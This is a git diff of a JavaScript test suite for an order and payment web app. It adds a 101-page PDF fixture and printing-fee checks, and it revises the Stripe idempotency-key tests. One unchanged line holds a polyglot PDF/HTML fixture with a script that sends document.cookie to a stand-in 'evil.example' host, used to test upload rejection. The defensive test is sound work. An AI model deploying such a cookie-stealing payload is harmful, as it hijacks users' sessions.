@@ -4,6 +4,7 @@ import { readdir, readFile } from 'node:fs/promises';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { handleMockApi, handleMockRoute } from './mock-api.mjs';
+import { testPdf } from './test-pdf.mjs';
 import { email, phone, text, longText, cleanDate, cleanOrderCode, cleanFileList, uuid, uuidList, getCookie, readJson, verifyFileMagic, timingSafeMatch } from '../api/_lib/core.mjs';
 import { cleanTrackToken, estimate, canMarkPaid, clean as scrubEmailText } from '../api/_lib/orders.mjs';
 import { savedClientSession, verifiedClient, clientCookie } from '../api/_lib/clients.mjs';
@@ -591,7 +592,7 @@ await step('High-concurrency stress test: 500+ parallel requests (SQLi floods, b
 // 11. Magic-Byte File Content Inspection & Admin Concurrent Session Cap
 await step('Magic-byte file inspection rejects disguised malware/HTML uploads and Admin session cap evicts oldest sessions beyond 5', async () => {
     // 11a. Unit checks on verifyFileMagic
-    const validPdf = Buffer.from('%PDF-1.7\n1 0 obj\n<<>>\nendobj\n');
+    const validPdf = testPdf(101);
     const validDocx = Buffer.concat([Buffer.from([0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x06, 0x00]), Buffer.from('[Content_Types].xmlPK\x03\x04word/document.xml')]);
     const validJpg = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46]);
     const validPng = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00]);
@@ -674,6 +675,12 @@ await step('Magic-byte file inspection rejects disguised malware/HTML uploads an
         totalAssertions++;
     }
     totalAssertions += 1;
+    const jobs = await (await callMock('admin', { action: 'list' }, adminCookies[5])).json();
+    const uploadedJob = jobs.orders.find(o => o.code === createRes.code);
+    const bill = await (await callMock('admin', { action: 'get', id: uploadedJob.id }, adminCookies[5])).json();
+    assert.equal(bill.printing.pages, 101);
+    assert.equal(bill.printing.feeCents, 15, 'Page 101 should add a $0.15 printing fee');
+    totalAssertions += 2;
 
     // 11d. Polyglot file & embedded PDF JavaScript/Launch detection
     const polyglotPdfHtml = Buffer.from('%PDF-1.7\n1 0 obj\n<!-- <script>fetch("https://evil.example/?c="+document.cookie)</script> -->\n');
@@ -697,16 +704,15 @@ await step('Magic-byte file inspection rejects disguised malware/HTML uploads an
     assert.equal(verifyFileMagic(zipWithExeAsDocx, 'embedded-exe.docx'), false, '.docx containing embedded .exe entry must be rejected');
     totalAssertions += 9;
 
-    // 11e. Stripe Checkout 24-hour hard expiry, 1-minute idempotency key, & strict canMarkPaid session/amount verification
+    // 11e. Stripe Checkout 24-hour hard expiry, one idempotency key per create attempt, & strict canMarkPaid session/amount verification
     const fixedNow = 1730000000000;
     const sampleOrd = { id: '4c190c16-ccb0-40c6-9c81-da1842658d52', code: 'NP-649025', client_email: 'paralegal@example.com', track_token: 'AbCdEfGhIjKlMnOpQrStUvWxYz012345' };
-    const cp1 = checkoutParams(sampleOrd, 9500, 'Standard service', 'https://nicksprocessservices.dev', fixedNow);
-    const cp2 = checkoutParams(sampleOrd, 9500, 'Standard service', 'https://nicksprocessservices.dev', fixedNow + 15000);
-    const cpNextMin = checkoutParams(sampleOrd, 9500, 'Standard service', 'https://nicksprocessservices.dev', fixedNow + 65000);
-    assert.equal(cp1.params.expires_at, Math.floor(fixedNow / 60000) * 60 + 86340, 'Expiry is rounded to the idempotency minute');
-    assert.equal(cp1.options.idempotencyKey, cp2.options.idempotencyKey, 'Double-click within same minute must produce identical Stripe idempotencyKey');
-    assert.deepEqual(cp1.params, cp2.params, 'Same key must carry identical parameters, or Stripe refuses the retry');
-    assert.notEqual(cp1.options.idempotencyKey, cpNextMin.options.idempotencyKey, 'Retry in next minute gets a fresh idempotencyKey');
+    const cp1 = checkoutParams(sampleOrd, 9500, 'Standard service', 'https://nicksprocessservices.dev', fixedNow, 'operation-a');
+    const cp2 = checkoutParams(sampleOrd, 9500, 'Standard service', 'https://nicksprocessservices.dev', fixedNow + 15000, 'operation-a');
+    const cpNextMin = checkoutParams(sampleOrd, 9500, 'Standard service', 'https://nicksprocessservices.dev', fixedNow + 15000, 'operation-b');
+    assert.equal(cp1.params.expires_at, Math.floor(fixedNow / 1000) + 86340);
+    assert.equal(cp1.options.idempotencyKey, cp2.options.idempotencyKey, 'A retry of one create attempt must reuse its Stripe idempotency key');
+    assert.notEqual(cp1.options.idempotencyKey, cpNextMin.options.idempotencyKey, 'Separate create attempts need different Stripe idempotency keys');
 
     const unpaidOrder = { id: sampleOrd.id, status: 'awaiting_payment', paid_at: null, stripe_session_id: 'cs_live_active123456', amount_due_cents: 12500 };
     assert.equal(canMarkPaid(unpaidOrder, 12500, 'cs_live_active123456'), true, 'Exact active session & amount must be accepted');
